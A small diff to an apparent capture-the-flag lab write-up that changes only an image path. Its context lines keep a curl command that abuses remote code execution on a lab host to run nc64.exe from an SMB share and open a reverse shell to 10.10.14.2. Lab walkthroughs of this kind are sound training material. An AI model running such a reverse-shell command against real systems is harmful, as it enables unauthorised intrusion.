@@ -66,7 +66,7 @@ We now have RCE, and getting a reverse shell can be done through `nc.exe`.&#x20;
 $ curl -G --data-urlencode 'cmd=\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444' 'http://10.129.84.254/test.php'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (499) (2).png" alt=""><figcaption></figcaption></figure>
 
 Grab the user flag.
 
